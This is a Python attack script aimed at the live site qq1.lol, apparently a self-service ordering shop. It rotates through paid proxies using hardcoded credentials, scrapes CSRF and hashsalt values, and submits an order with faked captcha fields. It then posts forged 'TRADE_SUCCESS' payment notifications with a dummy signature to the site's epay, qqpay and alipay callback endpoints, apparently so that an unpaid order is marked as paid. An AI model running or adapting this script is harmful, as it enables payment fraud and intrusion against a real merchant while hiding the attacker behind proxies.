#!/usr/bin/env python3
import json, subprocess, re, urllib.parse
from pathlib import Path

QG, PW = "C413ED6D", "344F550A6F8B"
BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep7")


def pick():
    d = json.loads(subprocess.check_output(
        ["curl", "-s", f"https://share.proxy.qg.net/query?key={QG}"], text=True, timeout=12
    ))
    for s in [x["server"] for x in d.get("data") or []]:
        cand = f"http://{QG}:{PW}@{s}"
        code = subprocess.run(
            ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t.out",
             "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
            capture_output=True, text=True, timeout=12,
        ).stdout.strip()
        if code == "200" and b"sitename" in open("/tmp/t.out", "rb").read():
            print("px", s)
            return cand
    return None


px = pick()
jar = str(OUT / "q.jar")
Path(jar).unlink(missing_ok=True)


def c(url, post=None):
    cmd = [
        "curl", "-sk", "--compressed", "--max-time", "20", "-x", px, "-b", jar, "-c", jar,
        "-A", "Mozilla/5.0", "-H", "Referer: https://qq1.lol/",
        "-w", "\n__HTTP:%{http_code}",
    ]
    if post is not None:
        cmd += [
            "-X", "POST", "--data-binary", urllib.parse.urlencode(post),
            "-H", "Content-Type: application/x-www-form-urlencoded",
        ]
    cmd.append(url)
    out = subprocess.run(cmd, capture_output=True, text=True, timeout=25).stdout or ""
    b, code = out.rsplit("__HTTP:", 1)
    return b.strip(), code.strip()


c(BASE + "/")
buy, _ = c(BASE + "/?mod=buy&cid=4&tid=102")
csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy).group(1)
hs_m = re.search(r"var hashsalt=(.+);", buy)
hs = subprocess.run(
    ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
    capture_output=True, text=True, timeout=5,
).stdout.strip()
pay, _ = c(BASE + "/ajax.php?act=pay", {
    "tid": "102", "num": "1", "inputvalue": "qpdump",
    "csrf_token": csrf, "hashsalt": hs,
    "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
})
print("pay", pay[:180])
tn = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay).group(1)
print("tn", tn)

for typ in ["qqpay", "alipay"]:
    sub, _ = c(f"{BASE}/other/submit.php?type={typ}&orderid={tn}")
    locs = re.findall(r"location\.href='([^']+)'", sub)
    print(f"submit_{typ} len={len(sub)} loc={locs}")
    page, code = c(f"{BASE}/other/{typ}.php?trade_no={tn}")
    print(f"{typ}.php HTTP={code} len={len(page)}")
    print("head", repr(page[:400]))
    (OUT / f"{typ}_page.html").write_text(page, errors="replace")
    print("urls", re.findall(r"https?://[^\s\"'<>]+", page)[:10])
    print("pid", re.findall(r"pid[=\"':\s]+([0-9A-Za-z]+)", page)[:8])
    print("form", re.findall(r"<form[^>]*>.*?</form>", page, re.S | re.I)[:1])

for path, label in [
    (f"{BASE}/other/epay_notify.php", "epay"),
    (f"{BASE}/other/qqpay_notify.php", "qqpay_n"),
    (f"{BASE}/other/alipay_notify.php", "alipay_n"),
]:
    nb, _ = c(path, {
        "out_trade_no": tn, "trade_no": "E" + tn, "trade_status": "TRADE_SUCCESS",
        "money": "1", "pid": "1000", "type": "alipay", "sign": "test", "name": "x",
        "sign_type": "MD5",
    })
    print(label, repr(nb[:200]))
